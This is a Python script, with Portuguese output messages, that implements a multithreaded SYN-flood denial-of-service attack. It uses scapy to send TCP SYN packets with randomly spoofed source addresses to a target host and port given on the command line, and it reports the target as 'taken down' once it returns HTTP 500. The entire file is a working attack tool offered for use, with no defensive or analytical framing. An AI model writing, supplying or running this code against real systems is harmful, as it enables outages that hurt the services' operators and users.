from scapy.all import IP, TCP, send
import ipaddress
from time import sleep, perf_counter
import random
import requests
import threading
import argparse
import socket
import sys

LOCK = threading.Lock()
event = threading.Event()


def test_connection(target: str, port: int) -> bool:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        status: int = s.connect_ex((target, port))

        return status == 0


def get_ips(rang: int) -> list[str]:
        random_ips = [ipaddress.IPv4Address(random.randint(0, 2**32 - 1)) for _ in range(rang)]

        return random_ips


def worker(target: str, port: int, verbose: bool, chunk: int, worker_id: str = '[UNKNOW]') -> None:
        if event.is_set():
                return

        try:
                test = requests.get(f'http://{target}:{port}').status_code
                if test == 500:
                        event.set()
                        return
        except requests.exceptions.ConnectionError:
                print('Alvo está fora do ar.')
                sys.exit(1)

        else:
                ips = get_ips(chunk)
                packages = IP(src=ips, dst=target) / TCP(sport=random.randint(80, 9999), dport=port, flags='S')
                send(packages, verbose=False)

                if verbose:
                        if not event.is_set():
                                with LOCK:
                                        print (f'INFO\t {chunk} pacotes enviados para {target}:{port} - WORKER::{worker_id}')


class Args:
        def __init__(self):
                args = self._get_args()

                self.verbose = args.verbose
                self.chunk = args.chunk_size
                self.threads = args.workers
                self.taddr = args.target
                self.tport = args.port

        def _get_args(self):
                parser = argparse.ArgumentParser()
                parser.add_argument('-t', '--target', required=True, type=str, help='Target ip address')
                parser.add_argument('-p', '--port', required=True, type=int, help='Target port')
                parser.add_argument('-c', '--chunk-size', type=int, default=100, help='How much packages workers will send')
                parser.add_argument('-w', '--workers', type=int, default=10, help='Threads number')
                parser.add_argument('-v', '--verbose', action='store_true', default=False, help='verbose mode (default=True)')
                args = parser.parse_args()

                return args





def main():
        args = Args()

        print(args.verbose)

        is_up: bool = test_connection(args.taddr, args.tport)
        if not is_up:
                print(f'[\033[31m-\033[m] Erro ao se conectar ao destino.')
                return

        print (f'[\033[32m+\033[m] Iniciando ataque contra {args.taddr}:{args.tport} com {args.threads} workers')

        threads: list[tuple] = []
        worker_ids = [i for i in range(1, args.threads + 1)]
        start = perf_counter()
        while not event.is_set():
                if len(threads) >= args.threads:
                        sleep(1)
                        for t in threads:
                                if not t[0].is_alive():
                                        threads.remove(t)
                                        worker_ids.append(t[1])
                        continue

                worker_id: int = worker_ids.pop()
                t = threading.Thread(
                        target=worker,
                        args=(
                                args.taddr,
                                args.tport,
                                args.verbose,
                                args.chunk,
                                f'[{worker_id}]'
                        )
                )

                threads.append((t, worker_id))
                t.start()

                worker_id += 1

        end = perf_counter()
        print (f'[\033[32m+\033[m] Alvo derrubado -> 500')

        for t in threads:
                t[0].join()
        print (f'Fim do programa :: elapsed -> {(end - start):.3f}')



if __name__ == '__main__':
        try:
                main()
        except KeyboardInterrupt:
                print ('O usuario escolheu sair.')
